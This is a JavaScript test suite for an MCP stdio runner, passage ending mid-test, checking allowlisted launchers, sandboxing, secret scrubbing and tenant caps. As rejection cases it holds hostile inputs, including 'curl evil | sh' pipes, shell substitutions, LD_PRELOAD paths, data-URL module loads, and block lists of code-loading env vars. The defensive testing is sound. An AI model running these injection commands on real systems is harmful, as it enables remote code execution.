'use strict';

// Uses `node fixture-child.js <mode>` as a deterministic stand-in "child"
// instead of a real npx/uvx package (NOT `node -e` - the runner now rejects
// inline-eval flags, mirroring core's McpStdioCommandGuard) - this suite is about relay/lifecycle correctness,
// not about any particular MCP server. `node` is one of the allowed
// launchers (ALLOWED_COMMANDS) and is cross-platform, so this suite runs the
// same way on the Linux container this service ships on and on a Windows/
// macOS dev host.

const { test, before, after } = require('node:test');
const assert = require('node:assert/strict');
const net = require('net');
const path = require('path');
const fs = require('fs');
const os = require('os');
const { TYPE_CONTROL, TYPE_STDOUT, encodeFrame, FrameReader } = require('./framing');

const CHILD = path.join(__dirname, 'fixture-child.js');

const TEST_PORT = 18097;
const TEST_HEALTH_PORT = 18098;
const TEST_SECRET = 'test-shared-secret-value';

process.env.MCP_STDIO_RUNNER_PORT = String(TEST_PORT);
process.env.MCP_STDIO_RUNNER_HEALTH_PORT = String(TEST_HEALTH_PORT);
process.env.MCP_STDIO_SIDECAR_SHARED_SECRET = TEST_SECRET;
process.env.MCP_STDIO_RUNNER_KILL_GRACE_MS = '200';
// SEC-012: sandboxes go under a throwaway root, never the real tmp root.
const SESSION_ROOT = fs.mkdtempSync(path.join(os.tmpdir(), 'mcp-runner-test-'));
process.env.MCP_RUNNER_SESSION_ROOT = SESSION_ROOT;
delete process.env.MCP_STDIO_SIDECAR_SHARED_SECRET_FILE;
delete process.env.MCP_RUNNER_UID_RANGE;
process.env.MCP_STDIO_RUNNER_MAX_CHILDREN = '3';
process.env.MCP_STDIO_RUNNER_MAX_CHILDREN_PER_TENANT = '2';
process.env.MCP_STDIO_RUNNER_QUEUE_WAIT_MS = '300';
process.env.MCP_STDIO_RUNNER_IDLE_TTL_MS = String(30 * 60 * 1000);

const runner = require('./server');

before(() => runner.start());
after(() => {
    runner.shutdown();
    fs.rmSync(SESSION_ROOT, { recursive: true, force: true });
});

/** Connects, sends the spawn control frame, and returns {socket, reader, events}. */
function spawnOverWire({ command, args = [], env = {}, secret = TEST_SECRET, tenantId }) {
    return new Promise((resolve, reject) => {
        const socket = net.createConnection(TEST_PORT, '127.0.0.1');
        const events = [];
        const reader = new FrameReader(
            (type, payload) => {
                if (type === TYPE_CONTROL) {
                    events.push({ type: TYPE_CONTROL, msg: JSON.parse(payload.toString('utf8')) });
                } else if (type === TYPE_STDOUT) {
                    events.push({ type: TYPE_STDOUT, data: Buffer.from(payload) });
                }
            },
            (err) => reject(err)
        );
        socket.on('data', (chunk) => reader.push(chunk));
        socket.on('error', reject);
        socket.on('connect', () => {
            socket.write(encodeFrame(TYPE_CONTROL, JSON.stringify({ command, args, env, secret, tenantId })));
            resolve({ socket, events });
        });
    });
}

function waitFor(events, predicate, timeoutMs = 3000) {
    return new Promise((resolve, reject) => {
        const deadline = Date.now() + timeoutMs;
        const tick = () => {
            const found = events.find(predicate);
            if (found) return resolve(found);
            if (Date.now() > deadline) return reject(new Error('timed out waiting for event'));
            setTimeout(tick, 20);
        };
        tick();
    });
}

test('rejects a spawn request with the wrong shared secret', async () => {
    const { events, socket } = await spawnOverWire({ command: 'node', args: [CHILD, 'hello'], secret: 'wrong' });
    const err = await waitFor(events, (e) => e.type === TYPE_CONTROL && e.msg.type === 'error');
    assert.equal(err.msg.message, 'unauthorized');
    socket.destroy();
});

test('rejects a command not on the allowlist', async () => {
    const { events, socket } = await spawnOverWire({ command: 'bash', args: ['-c', 'echo hi'] });
    const err = await waitFor(events, (e) => e.type === TYPE_CONTROL && e.msg.type === 'error');
    assert.match(err.msg.message, /command not allowed/);
    socket.destroy();
});

test('the spawned child gets this container\'s own PATH/HOME even when the caller supplies none', async () => {
    // Regression test: found live (container smoke test, not this suite) -
    // the runner used to build the child's env ONLY from the caller-supplied
    // map, so a spawn request with no explicit PATH (the realistic case - a
    // registration's configured env is just that server's own API keys,
    // never PATH) failed every time with ENOENT even for an allowed launcher
    // genuinely present on this image's PATH. `env: {}` below is
    // deliberately empty - proves PATH/HOME come from THIS process's own
    // environment, not the caller's, by asserting the child's PATH is
    // exactly this test process's own process.env.PATH.
    const { events, socket } = await spawnOverWire({
        command: 'node',
        args: [CHILD, 'print-path'],
        env: {},
    });
    await waitFor(events, (e) => e.type === TYPE_CONTROL && e.msg.type === 'exit');
    const stdoutBytes = Buffer.concat(events.filter((e) => e.type === TYPE_STDOUT).map((e) => e.data));
    assert.equal(stdoutBytes.toString('utf8'), process.env.PATH || '');
    assert.notEqual(stdoutBytes.length, 0, 'PATH must not be empty - an empty PATH is exactly the bug this test guards against');
    socket.destroy();
});

test('the spawned child\'s PATH/HOME cannot be overridden by the caller-supplied env', async () => {
    // Regression test, 2026-08-13 live incident: core/mcp-stdio-proxy/proxy.js
    // used to forward its OWN process.env wholesale (everything except its 4
    // control vars) - which includes ITS OWN PATH/HOME (core's, e.g.
    // HOME=/home/agentic), not anything a tenant configured. This runner then
    // applied that caller-supplied env ON TOP of its own correct PATH/HOME
    // defaults, so the leaked values silently won: a spawned `uv` resolved
    // Python against system 3.11 instead of the managed 3.12 this container
    // actually has, because HOME pointed at a directory that doesn't exist
    // here at all. proxy.js now filters PATH/HOME before forwarding (the real
    // fix); this test guards the OTHER half - even if a caller DOES send
    // PATH/HOME (a proxy.js regression, or some other/future caller), this
    // runner must never let them win.
    const bogusPath = '/definitely/not/a/real/path';
    const bogusHome = '/definitely/not/a/real/home';
    const { events, socket } = await spawnOverWire({
        command: 'node',
        args: [CHILD, 'print-path-home'],
        env: { PATH: bogusPath, HOME: bogusHome },
    });
    await waitFor(events, (e) => e.type === TYPE_CONTROL && e.msg.type === 'exit');
    const stdoutBytes = Buffer.concat(events.filter((e) => e.type === TYPE_STDOUT).map((e) => e.data));
    const seen = JSON.parse(stdoutBytes.toString('utf8'));
    assert.equal(seen.path, process.env.PATH || '', 'a caller-supplied PATH must never override this container\'s own');
    // SEC-012: HOME is now the connection's private sandbox, not the container's.
    assert.ok(seen.home.startsWith(path.join(SESSION_ROOT, 'conn-')), `HOME ${seen.home} must be a private sandbox`);
    assert.notEqual(seen.path, bogusPath);
    assert.notEqual(seen.home, bogusHome);
    socket.destroy();
});

test('image-level browser settings pass through to the child; nothing else from the runner env does', async () => {
    // The browser image (Dockerfile WITH_BROWSERS=true) bakes the browser
    // cache paths + DOCKER_CONTAINER into its own env; children must see them
    // (as overridable defaults) - but never any other runner env var, which is
    // where MCP_STDIO_SIDECAR_SHARED_SECRET lives.
    process.env.PLAYWRIGHT_BROWSERS_PATH = '/opt/playwright-browsers';
    process.env.DOCKER_CONTAINER = 'true';
    try {
        const { events, socket } = await spawnOverWire({
            command: 'node',
            args: [CHILD, 'print-image-env'],
            env: { DOCKER_CONTAINER: 'caller-wins' },
        });
        await waitFor(events, (e) => e.type === TYPE_CONTROL && e.msg.type === 'exit');
        const stdoutBytes = Buffer.concat(events.filter((e) => e.type === TYPE_STDOUT).map((e) => e.data));
        const seen = JSON.parse(stdoutBytes.toString('utf8'));
        assert.equal(seen.pw, '/opt/playwright-browsers');
        assert.equal(seen.dc, 'caller-wins', 'a registration may override an image default');
        assert.equal(seen.pp, process.env.PUPPETEER_CACHE_DIR || null);
        assert.equal(seen.secret, null, 'the runner shared secret must never reach a child');
        socket.destroy();
    } finally {
        delete process.env.PLAYWRIGHT_BROWSERS_PATH;
        delete process.env.DOCKER_CONTAINER;
    }
});

test('spawns an allowed command and relays stdout byte-for-byte', async () => {
    const { events, socket } = await spawnOverWire({ command: 'node', args: [CHILD, 'hello'] });
    await waitFor(events, (e) => e.type === TYPE_CONTROL && e.msg.type === 'spawned');
    await waitFor(events, (e) => e.type === TYPE_CONTROL && e.msg.type === 'exit');
    const stdoutBytes = Buffer.concat(events.filter((e) => e.type === TYPE_STDOUT).map((e) => e.data));
    assert.equal(stdoutBytes.toString('utf8'), 'hello-stdout\n');
    socket.destroy();
});

test('relays stderr as line-delimited control frames', async () => {
    const { events, socket } = await spawnOverWire({
        command: 'node',
        args: [CHILD, 'stderr-lines'],
    });
    await waitFor(events, (e) => e.type === TYPE_CONTROL && e.msg.type === 'exit');
    const stderrLines = events.filter((e) => e.type === TYPE_CONTROL && e.msg.type === 'stderr').map((e) => e.msg.line);
    assert.deepEqual(stderrLines, ['line-one', 'line-two']);
    socket.destroy();
});

test('relays the child exit code', async () => {
    const { events, socket } = await spawnOverWire({ command: 'node', args: [CHILD, 'exit-7'] });
    const exit = await waitFor(events, (e) => e.type === TYPE_CONTROL && e.msg.type === 'exit');
    assert.equal(exit.msg.code, 7);
    socket.destroy();
});

test('closing the socket kills the still-running child', async () => {
    const { events, socket } = await spawnOverWire({ command: 'node', args: [CHILD, 'idle'] });
    const spawned = await waitFor(events, (e) => e.type === TYPE_CONTROL && e.msg.type === 'spawned');
    const pid = spawned.msg.pid;

    const isAlive = () => {
        try {
            process.kill(pid, 0);
            return true;
        } catch (_e) {
            return false;
        }
    };
    assert.equal(isAlive(), true, 'child should be running right after spawn');

    socket.destroy();

    await new Promise((resolve, reject) => {
        const deadline = Date.now() + 3000;
        const tick = () => {
            if (!isAlive()) return resolve();
            if (Date.now() > deadline) return reject(new Error('child was not reaped after socket close'));
            setTimeout(tick, 50);
        };
        tick();
    });
});

test('/health responds 200', async () => {
    const res = await new Promise((resolve, reject) => {
        require('http').get(`http://127.0.0.1:${TEST_HEALTH_PORT}/health`, resolve).on('error', reject);
    });
    assert.equal(res.statusCode, 200);
});

// ---------------------------------------------------------------------------
// SVC-004: McpStdioCommandGuard mirror (validateSpawnRequest). Cases follow
// core/mcp/src/test/java/com/agenticai/core/mcp/McpStdioCommandGuardTest.java.
// ---------------------------------------------------------------------------

const { validateSpawnRequest, checkEnv } = runner;

const rejected = (command, args, env) => {
    const reason = validateSpawnRequest(command, args, env);
    assert.ok(reason, `${command} ${JSON.stringify(args)} ${JSON.stringify(env || {})} should be rejected`);
    return reason;
};
const allowed = (command, args, env) => {
    assert.equal(validateSpawnRequest(command, args, env), null,
        `${command} ${JSON.stringify(args)} ${JSON.stringify(env || {})} should be allowed`);
};

test('policy: the personal-install starter connectors (core/mcp McpStarterCatalog) pass the runner gate', () => {
    // Exact-version package specs, `name@version`: the `@` is not a shell character or a flag.
    allowed('uvx', ['mcp-server-fetch@2026.8.18']);
    allowed('uvx', ['mcp-server-time@2026.8.18']);
    allowed('npx', ['-y', '@modelcontextprotocol/server-sequential-thinking@2026.8.31']);
});

test('policy: allowed launchers accept ordinary package/entrypoint invocations', () => {
    for (const cmd of ['npx', 'node', 'uvx', 'uv', 'python', 'python3']) {
        allowed(cmd, ['-y', '@modelcontextprotocol/server-brave-search']);
    }
    allowed('npx', ['-y', '@some/mcp-server']);
    allowed('uvx', ['--from', 'dee-mcp', 'dee-mcp-server']);
    allowed('uvx', ['some-mcp-server']);
    allowed('python3', ['-m', 'some_mcp_server', '--port=stdio']);
    allowed('python', ['-m', 'some_mcp_module']);
    allowed('node', ['./server.js', '--port', '0']);
    allowed('node', ['server.js']);
    allowed('node', ['./bin/server-r.js']);
    allowed('npx', ['-y', '@scope/mcp-require-server']);
    allowed('npx', ['-y', 'some-mcp', '--data-dir=/opt/mcp/-import']);
    allowed('npx', ['-y', 'some-mcp', '-verbose']);
    allowed('npx', ['-y', 'some-mcp', '-port', '8080']);
    allowed('npx', ['-y', 'some-mcp', '--config', 'cfg.json']);
    allowed('python3', ['-B', '-E', '-P', '-m', 'srv']); // uppercase hardening flags are fine
});

test('policy: node -p / -r are node-only - other launchers keep their own meaning', () => {
    allowed('npx', ['-p', 'some-mcp-package']);
    allowed('uv', ['-p', '3.12']);
    allowed('uvx', ['-p', '3.12']);
    allowed('npx', ['-r', 'us-east-1']);
});

test('policy: launcher allowlist (exact, no paths, no suffix, no whitespace)', () => {
    for (const cmd of ['bash', 'sh', 'cmd', 'powershell', 'curl', 'wget', 'docker', 'java', 'perl', 'ruby',
        '/bin/bash', '/usr/bin/env', './node', 'npx -y pkg', '', 'npx;id', 'npx.cmd', 'NODE']) {
        assert.match(rejected(cmd, []), /command not allowed/);
    }
    assert.match(rejected(undefined, []), /command not allowed/);
    assert.match(rejected('node', 'server.js'), /args must be an array of strings/);
    assert.match(rejected('node', [1]), /args must be an array of strings/);
});

test('policy: node inline-eval flags - separate, = joined and attached forms', () => {
    for (const args of [
        ['-e', "require('child_process').execSync('id')"],
        ['-econsole.log(1)'],
        ['--eval', 'process.exit(1)'],
        ['--eval=require("fs")'],
        ['--Eval=1+1'],
        ['--print', '1+1'],
        ['--print=1+1'],
        ['-p', '1+1'],
        ['-p1+1'],
    ]) {
        assert.match(rejected('node', args), /arg not allowed: .*inline-code\/module-loading flag/);
    }
});

test('policy: node module-loading flags - separate, = joined, attached and case variants', () => {
    const payload = "data:text/javascript,import('child_process')";
    for (const flag of ['--import', '--require', '--loader', '--experimental-loader', '--node-options']) {
        assert.match(rejected('node', [flag, payload]), /inline-code\/module-loading flag/, `${flag} <payload>`);
        assert.match(rejected('node', [`${flag}=${payload}`]), /inline-code\/module-loading flag/, `${flag}=<payload>`);
    }
    rejected('node', ['--IMPORT', 'data:text/javascript,x']);
    rejected('node', ['--import', "data:text/javascript,import('node:child_process').execSync('id')", 'server.js']);
    rejected('node', ['-r', './evil.js']);
    rejected('node', ['-r./evil.js']);
    // npx's --node-options pass-through is blocked for every launcher, not just node.
    rejected('npx', ['--node-options=--require=./evil.js', '-y', 'pkg']);
});

test('policy: --inspect* debugger family', () => {
    rejected('node', ['--inspect', 'server.js']);
    rejected('node', ['--inspect-brk=0.0.0.0:9229', 'server.js']);
    rejected('node', ['--inspect=0.0.0.0:9229']);
    rejected('node', ['--inspect-port', '9229']);
});

test('policy: python -c / --command (separate, joined, attached, clustered)', () => {
    rejected('python3', ['-c', "import os; os.system('id')"]);
    rejected('python3', ['-cprint(1)']);
    rejected('python3', ['-c=print(1)']);
    rejected('python', ['--command', 'print(1)']);
    rejected('python', ['--command=print(1)']);
    rejected('python3', ['-Bc', "import os; os.system('id')"]);
    rejected('python', ['-uc', 'print(1)']);
    rejected('uv', ['run', '-c', 'x']);
});

test('policy: npx/uvx -c shell flags', () => {
    rejected('npx', ['-c', 'curl evil | sh']);
    rejected('npx', ['-c', 'curl evil']);
    rejected('npx', ['-yc', 'curl evil']);
    rejected('uvx', ['-c', 'x']);
    // Known, accepted over-block inherited from core: single-dash server
    // options starting with a blocked letter. Two-dash spelling works.
    rejected('npx', ['-y', 'some-mcp', '-config', 'cfg.json']);
});

test('policy: shell metacharacters and $( substitution in args', () => {
    for (const arg of ['pkg && curl evil.sh | sh', '`id`', 'a;b', '$(whoami)', 'line1\nline2', 'a>b', 'a<b', 'nul\0x']) {
        assert.match(rejected('npx', ['-y', arg]), /arg not allowed: .*forbidden shell/);
    }
});

test('policy: denied env names (exact, lower and mixed case) are rejected, not dropped', () => {
    const names = [
        'NODE_OPTIONS', 'NODE_REPL_EXTERNAL_MODULE', 'NODE_PATH', 'NPM_CONFIG_NODE_OPTIONS', 'NPM_CONFIG_SCRIPT_SHELL',
        'PYTHONSTARTUP', 'PYTHONPATH', 'PYTHONHOME', 'PYTHONUSERBASE', 'PYTHONWARNINGS', 'PYTHONINSPECT',
        'PYTHONEXECUTABLE', 'BASH_ENV', 'ENV', 'SHELLOPTS', 'PERL5OPT', 'PERL5LIB', 'RUBYOPT',
        'JAVA_TOOL_OPTIONS', '_JAVA_OPTIONS', 'JDK_JAVA_OPTIONS', 'GIT_SSH', 'GIT_SSH_COMMAND', 'GIT_EXTERNAL_DIFF',
    ];
    for (const n of names) {
        assert.ok(runner.BLOCKED_ENV_NAMES.has(n), `${n} missing from BLOCKED_ENV_NAMES`);
        for (const variant of [n, n.toLowerCase(), n[0] + n.slice(1).toLowerCase()]) {
            assert.match(rejected('npx', ['-y', 'pkg'], { [variant]: 'x' }),
                /env not allowed: .*controls how the runtime loads code/, variant);
        }
    }
    rejected('node', ['server.js'], { NODE_OPTIONS: "--import data:text/javascript,import('child_process')" });
});

test('policy: denied env prefixes LD_ / DYLD_ / BASH_FUNC_ (any case)', () => {
    for (const n of ['LD_PRELOAD', 'LD_LIBRARY_PATH', 'LD_AUDIT', 'ld_preload', 'Ld_Library_Path',
        'DYLD_INSERT_LIBRARIES', 'DYLD_LIBRARY_PATH', 'dyld_insert_libraries', 'Dyld_Insert_Libraries', 'BASH_FUNC_x']) {
        assert.match(checkEnv({ [n]: '/tmp/evil.so' }), /env not allowed/, n);
    }
});

test('policy: malformed env names and values', () => {
    assert.match(checkEnv({ 'BASH_FUNC_x%%': '() { id; }' }), /env not allowed/);
    assert.match(checkEnv({ '1ABC': 'x' }), /not a valid name/);
    assert.match(checkEnv({ 'A-B': 'x' }), /not a valid name/);
    assert.match(checkEnv({ '': 'x' }), /must not be empty/);
    assert.match(checkEnv({ API_KEY: 'a\0b' }), /NUL/);
    assert.match(checkEnv({ API_KEY: 42 }), /string value/);
    assert.match(checkEnv({ API_KEY: null }), /string value/);
    assert.match(checkEnv(['A=b']), /env must be an object/);
});

test('policy: ordinary env (API keys, PEM values, deliberately-allowed runtime vars) passes', () => {
    assert.equal(checkEnv(undefined), null);
    assert.equal(checkEnv({}), null);
    allowed('npx', ['-y', 'pkg'], {
        GITHUB_PERSONAL_ACCESS_TOKEN: 'ghp_x',
        BRAVE_API_KEY: 'k',
        SLACK_TEAM_ID: 'T1',
        MCP_POSTGRES_CONNECTION_STRING: 'postgres://u:p@h/db',
        GOOGLE_SA_JSON: '{\n  "private_key": "-----BEGIN KEY-----\\nabc\\n-----END KEY-----"\n}',
        PYTHONUNBUFFERED: '1',
        PYTHONIOENCODING: 'utf-8',
        NODE_ENV: 'production',
        PIP_INDEX_URL: 'https://pypi.org/simple',
        DOCKER_CONTAINER: 'true',
        PLAYWRIGHT_BROWSERS_PATH: '/opt/pw',
        PATH: '/ignored', // neutralised by override in handleSpawnRequest, see server.js
        HOME: '/ignored',
    });
});

test('over the wire: a denied flag is rejected with an error frame and nothing is spawned', async () => {
    const { events, socket } = await spawnOverWire({ command: 'node', args: ['--eval=process.exit(0)'] });
    const err = await waitFor(events, (e) => e.type === TYPE_CONTROL && e.msg.type === 'error');
    assert.match(err.msg.message, /arg not allowed/);
    assert.equal(events.some((e) => e.type === TYPE_CONTROL && e.msg.type === 'spawned'), false);
    socket.destroy();
});

test('over the wire: a denied env key is rejected with an error frame and nothing is spawned', async () => {
    const { events, socket } = await spawnOverWire({
        command: 'node',
        args: [CHILD, 'hello'],
        env: { node_options: "--import=data:text/javascript,import('child_process')" },
    });
    const err = await waitFor(events, (e) => e.type === TYPE_CONTROL && e.msg.type === 'error');
    assert.match(err.msg.message, /env not allowed: 'node_options'/);
    assert.equal(events.some((e) => e.type === TYPE_CONTROL && e.msg.type === 'spawned'), false);
    socket.destroy();
});

test('over the wire: ordinary env reaches the child alongside the container PATH', async () => {
    const { events, socket } = await spawnOverWire({
        command: 'node',
        args: [CHILD, 'print-env-var', 'BRAVE_API_KEY'],
        env: { BRAVE_API_KEY: 'brave-key-123', Path: '/definitely/not/a/real/path' },
    });
    await waitFor(events, (e) => e.type === TYPE_CONTROL && e.msg.type === 'exit');
    const stdoutBytes = Buffer.concat(events.filter((e) => e.type === TYPE_STDOUT).map((e) => e.data));
    assert.equal(stdoutBytes.toString('utf8'), 'brave-key-123');
    socket.destroy();
});

// ---------------------------------------------------------------------------
// SEC-012: per-connection sandbox (private HOME/TMPDIR/caches), optional
// per-child uid, shared secret scrubbed from the runner env / _FILE support.
// ---------------------------------------------------------------------------

async function runToExit(opts) {
    const { events, socket } = await spawnOverWire(opts);
    await waitFor(events, (e) => e.type === TYPE_CONTROL && e.msg.type === 'exit');
    const out = Buffer.concat(events.filter((e) => e.type === TYPE_STDOUT).map((e) => e.data)).toString('utf8');
    socket.destroy();
    return out;
}

function waitUntil(cond, timeoutMs = 3000) {
    return new Promise((resolve, reject) => {
        const deadline = Date.now() + timeoutMs;
        const tick = () => {
            if (cond()) return resolve();
            if (Date.now() > deadline) return reject(new Error('condition not met in time'));
            setTimeout(tick, 25);
        };
        tick();
    });
}

test('sandbox: each connection gets its own private HOME, TMPDIR, npm/uv caches and XDG dirs', async () => {
    const a = JSON.parse(await runToExit({ command: 'node', args: [CHILD, 'print-sandbox'] }));
    const b = JSON.parse(await runToExit({ command: 'node', args: [CHILD, 'print-sandbox'] }));
    for (const seen of [a, b]) {
        const dir = path.dirname(seen.home);
        assert.equal(path.dirname(dir), SESSION_ROOT);
        assert.ok(path.basename(dir).startsWith('conn-'));
        assert.equal(seen.homeWritable, true, 'the child must be able to write its own HOME');
        assert.equal(seen.cwd, process.cwd(), 'cwd stays the runner WORKDIR (relative registrations rely on it)');
        assert.equal(seen.tmpdir, path.join(dir, 'tmp'));
        assert.equal(seen.npmCache, path.join(seen.home, '.npm'));
        assert.equal(seen.uvCache, path.join(seen.home, '.cache', 'uv'));
        assert.equal(seen.xdgCache, path.join(seen.home, '.cache'));
        assert.equal(seen.xdgConfig, path.join(seen.home, '.config'));
        assert.equal(seen.xdgData, path.join(seen.home, '.local', 'share'));
        if (process.platform !== 'win32') assert.equal(seen.homeMode, 0o700, 'HOME must be 0700');
    }
    assert.notEqual(a.home, b.home, 'two connections must never share a HOME');
});

test('sandbox: caller-supplied HOME/TMPDIR/cache/XDG overrides (any case) are ignored', async () => {
    const bogus = '/definitely/not/a/real/dir';
    const seen = JSON.parse(await runToExit({
        command: 'node',
        args: [CHILD, 'print-sandbox'],
        env: {
            home: bogus,
            TMPDIR: bogus,
            NPM_CONFIG_CACHE: bogus,
            npm_config_cache: bogus,
            Npm_Config_Userconfig: bogus,
            UV_CACHE_DIR: bogus,
            uv_python_install_dir: bogus,
            XDG_CACHE_HOME: bogus,
            xdg_config_home: bogus,
            XDG_DATA_HOME: bogus,
        },
    }));
    for (const [k, v] of Object.entries(seen)) {
        assert.notEqual(v, bogus, `${k} was overridden by the caller`);
    }
    if (process.platform !== 'win32') {
        // Windows env names are case-insensitive, so this only means something on POSIX.
        assert.equal(seen.npmCacheUpper, null, 'an upper-case NPM_CONFIG_CACHE must not sit alongside ours');
        assert.equal(seen.uvPython, null);
    }
    assert.ok(seen.home.startsWith(path.join(SESSION_ROOT, 'conn-')));
});

test('sandbox: the private directory is deleted once the child exits', async () => {
    const seen = JSON.parse(await runToExit({ command: 'node', args: [CHILD, 'print-sandbox'] }));
    const dir = path.dirname(seen.home);
    await waitUntil(() => !fs.existsSync(dir));
});

test('sandbox: the private directory is deleted when the socket closes on a still-running child', async () => {
    const before = new Set(fs.readdirSync(SESSION_ROOT));
    const { events, socket } = await spawnOverWire({ command: 'node', args: [CHILD, 'idle'] });
    await waitFor(events, (e) => e.type === TYPE_CONTROL && e.msg.type === 'spawned');
    const created = fs.readdirSync(SESSION_ROOT).filter((n) => !before.has(n));
    assert.equal(created.length, 1, 'exactly one sandbox for the one connection');
    socket.destroy();
    await waitUntil(() => !fs.existsSync(path.join(SESSION_ROOT, created[0])));
});

test('sandbox: a rejected request creates no sandbox', async () => {
    const before = fs.readdirSync(SESSION_ROOT).length;
    const { events, socket } = await spawnOverWire({ command: 'node', args: ['--eval=1'] });
    await waitFor(events, (e) => e.type === TYPE_CONTROL && e.msg.type === 'error');
    socket.destroy();
    assert.equal(fs.readdirSync(SESSION_ROOT).length, before);
});

test('buildChildEnv: runner-owned names win, image passthroughs are overridable, nothing else leaks', () => {
    const layout = runner.sessionLayout('/s/conn-x');
    const env = runner.buildChildEnv(
        { API_KEY: 'k', Home: '/evil', xdg_cache_home: '/evil', DOCKER_CONTAINER: 'caller' },
        layout,
        { PATH: '/usr/bin', HOME: '/home/mcprunner', DOCKER_CONTAINER: 'true', PUPPETEER_CACHE_DIR: '/opt/p', SOMETHING_ELSE: 'x' },
    );
    assert.equal(env.API_KEY, 'k');
    assert.equal(env.PATH, '/usr/bin');
    assert.equal(env.HOME, layout.home);
    assert.equal(env.XDG_CACHE_HOME, layout.cache);
    assert.equal(env.Home, undefined);
    assert.equal(env.xdg_cache_home, undefined);
    assert.equal(env.DOCKER_CONTAINER, 'caller');
    assert.equal(env.PUPPETEER_CACHE_DIR, '/opt/p');
    assert.equal(env.SOMETHING_ELSE, undefined);
    for (const name of ['PATH', 'HOME', 'TMPDIR', 'NPM_CONFIG_CACHE', 'UV_CACHE_DIR', 'XDG_CACHE_HOME', 'XDG_CONFIG_HOME']) {
        assert.ok(runner.RUNNER_OWNED_ENV.has(name), name);
    }
});

test('shared secret: removed from the runner env after load, never reaches a child', async () => {
    assert.equal(process.env.MCP_STDIO_SIDECAR_SHARED_SECRET, undefined, 'must be scrubbed from process.env');
    // ...and auth still works with the value loaded before the scrub (a
    // wrong secret would get 'unauthorized' and no exit frame).
    const out = await runToExit({ command: 'node', args: [CHILD, 'print-env-var', 'MCP_STDIO_SIDECAR_SHARED_SECRET'] });
    assert.equal(out, '');
});

test('shared secret: _FILE is preferred, trailing newline stripped, unreadable/empty fails closed', () => {
    const files = { '/run/secrets/s': 'from-file\n', '/run/secrets/empty': '' };
    const read = (p) => {
        if (!(p in files)) throw new Error('ENOENT');
        return files[p];
    };
    const both = runner.loadSharedSecret({
        MCP_STDIO_SIDECAR_SHARED_SECRET: 'from-env',
        MCP_STDIO_SIDECAR_SHARED_SECRET_FILE: '/run/secrets/s',
    }, read);
    assert.deepEqual(both, { secret: 'from-file', source: 'file', error: null });
    assert.equal(runner.loadSharedSecret({ MCP_STDIO_SIDECAR_SHARED_SECRET: 'from-env' }, read).secret, 'from-env');
    const missing = runner.loadSharedSecret({
        MCP_STDIO_SIDECAR_SHARED_SECRET: 'from-env',
        MCP_STDIO_SIDECAR_SHARED_SECRET_FILE: '/nope',
    }, read);
    assert.equal(missing.secret, '', 'an unreadable _FILE must NOT fall back to the env var');
    assert.match(missing.error, /cannot read/);
    assert.match(runner.loadSharedSecret({ MCP_STDIO_SIDECAR_SHARED_SECRET_FILE: '/run/secrets/empty' }, read).error, /empty/);
    assert.deepEqual(runner.loadSharedSecret({}, read), { secret: '', source: 'none', error: null });
});

test('shared secret: a real _FILE is read end to end', () => {
    const p = path.join(SESSION_ROOT, 'secret-file');
    fs.writeFileSync(p, 'file-secret\r\n');
    try {
        assert.equal(runner.loadSharedSecret({ MCP_STDIO_SIDECAR_SHARED_SECRET_FILE: p }).secret, 'file-secret');
    } finally {
        fs.rmSync(p, { force: true });
    }
});

test('uid mode: MCP_RUNNER_UID_RANGE parsing', () => {
    assert.equal(runner.parseUidRange(undefined), null);
    assert.equal(runner.parseUidRange(''), null);
    assert.deepEqual(runner.parseUidRange('200000-200999'), { start: 200000, end: 200999 });
    assert.deepEqual(runner.parseUidRange(' 200000 - 200001 '), { start: 200000, end: 200001 });
    assert.throws(() => runner.parseUidRange('abc'), /must look like/);
    assert.throws(() => runner.parseUidRange('100-200'), /10000 or above/);
    assert.throws(() => runner.parseUidRange('200010-200000'), /below its start/);
    assert.throws(() => runner.parseUidRange('200000-200999', 200500), /own uid/);
});

test('uid mode: needs all of CAP_SETUID, CAP_SETGID, CAP_CHOWN, CAP_KILL in CapEff', () => {
    const status = (hex) => `Name:\tnode\nCapInh:\t0000000000000000\nCapEff:\t${hex}\n`;
    assert.deepEqual(runner.missingCaps(status('00000000000000e1')), []); // bits 0,5,6,7
    assert.deepEqual(runner.missingCaps(status('00000000a80425fb')), []); // docker's default set
    assert.deepEqual(runner.missingCaps(status('0000000000000000')), ['CAP_SETUID', 'CAP_SETGID', 'CAP_CHOWN', 'CAP_KILL']);
    assert.deepEqual(runner.missingCaps(status('00000000000000c1')), ['CAP_KILL']);
    assert.deepEqual(runner.missingCaps(''), ['CAP_SETUID', 'CAP_SETGID', 'CAP_CHOWN', 'CAP_KILL']);
});

test('uid mode: pool hands out distinct uids, reuses least-recently-released, quarantines dirty ones', () => {
    const pool = runner.createUidPool({ start: 200000, end: 200002 });
    const a = pool.acquire();
    const b = pool.acquire();
    const c = pool.acquire();
    assert.deepEqual([a, b, c], [200000, 200001, 200002]);
    assert.equal(pool.acquire(), null, 'an exhausted pool refuses rather than sharing a uid');
    pool.release(b);
    pool.release(a, { clean: false });
    assert.equal(pool.acquire(), b);
    assert.equal(pool.acquire(), null, 'a quarantined uid is never handed out again');
    assert.deepEqual(pool.stats(), { free: 0, inUse: 2, quarantined: 1 });
});

test('uid mode: OFF in this test run (no MCP_RUNNER_UID_RANGE), with the reason logged', () => {
    assert.equal(runner.UID_MODE.enabled, false);
    assert.match(runner.UID_MODE.reason, /OFF/);
});


const SLEEP = [CHILD, 'idle'];
const closeAll = (...ws) => ws.forEach((w) => w.socket.destroy());
const waitEmpty = async () => {
    const dl = Date.now() + 3000;
    while (runner.children.size > 0 && Date.now() < dl) await new Promise((r) => setTimeout(r, 20));
};

test('per-tenant cap rejects the excess spawn with an error frame', async () => {
    const a = await spawnOverWire({ command: 'node', args: SLEEP, tenantId: 't1' });
    const b = await spawnOverWire({ command: 'node', args: SLEEP, tenantId: 't1' });
    await waitFor(a.events, (e) => e.msg && e.msg.type === 'spawned');
    await waitFor(b.events, (e) => e.msg && e.msg.type === 'spawned');
    const c = await spawnOverWire({ command: 'node', args: SLEEP, tenantId: 't1' });
    const err = await waitFor(c.events, (e) => e.msg && e.msg.type === 'error');
    assert.match(err.msg.message, /tenant at capacity/);
    // A different tenant is unaffected.
    const d = await spawnOverWire({ command: 'node', args: SLEEP, tenantId: 't2' });
    await waitFor(d.events, (e) => e.msg && e.msg.type === 'spawned');
    // Global cap (3) now reached.
    const e2 = await spawnOverWire({ command: 'node', args: SLEEP, tenantId: 't3' });
    const err2 = await waitFor(e2.events, (e) => e.msg && e.msg.type === 'error');
    assert.match(err2.msg.message, /runner at capacity/);
    closeAll(a, b, c, d, e2);
    await waitEmpty();
